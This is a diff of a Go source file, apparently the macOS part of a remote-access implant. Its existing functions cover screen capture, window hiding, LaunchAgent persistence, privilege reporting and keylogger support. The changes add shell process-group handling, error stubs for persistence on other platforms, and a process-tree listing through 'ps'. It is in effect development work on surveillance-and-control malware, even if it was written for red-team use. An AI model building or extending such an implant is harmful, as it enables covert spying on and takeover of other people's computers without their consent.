@@ -61,8 +61,16 @@ func captureScreenRGBA() (*image.RGBA, error) {
 
 func applyHideWindow(cmd *exec.Cmd) {}
 
-func addPersistenceWindows()     {}
-func addPersistenceLinux() error { return nil }
+func setShellProcGroup(cmd *exec.Cmd) {}
+
+func killShellProcGroup(cmd *exec.Cmd) {
+	if cmd != nil && cmd.Process != nil {
+		_ = cmd.Process.Kill()
+	}
+}
+
+func addPersistenceWindows() error { return fmt.Errorf("persistence: windows not supported on darwin") }
+func addPersistenceLinux() error   { return fmt.Errorf("persistence: linux not supported on darwin") }
 
 // addPersistenceDarwin installs a LaunchAgent plist in ~/Library/LaunchAgents.
 func addPersistenceDarwin() error {
@@ -151,6 +159,35 @@ func getPlatformSecurityInfo() (string, bool, string) {
 	}
 	domain, _ := os.Hostname()
 	return integrity, elevated, domain
+}
+
+func listProcessesForTree() ([]procNode, error) {
+	out, err := exec.Command("ps", "-axo", "pid=,ppid=,user=,comm=").Output()
+	if err != nil {
+		return nil, err
+	}
+	var nodes []procNode
+	for _, line := range strings.Split(string(out), "\n") {
+		fields := strings.Fields(line)
+		if len(fields) < 4 {
+			continue
+		}
+		pid, err1 := strconv.Atoi(fields[0])
+		ppid, err2 := strconv.Atoi(fields[1])
+		if err1 != nil || err2 != nil {
+			continue
+		}
+		nodes = append(nodes, procNode{
+			PID:  pid,
+			PPID: ppid,
+			User: fields[2],
+			Name: strings.Join(fields[3:], " "),
+		})
+	}
+	if len(nodes) == 0 {
+		return nil, fmt.Errorf("ps returned no processes")
+	}
+	return nodes, nil
 }
 
 func keyloggerAvailable() error {
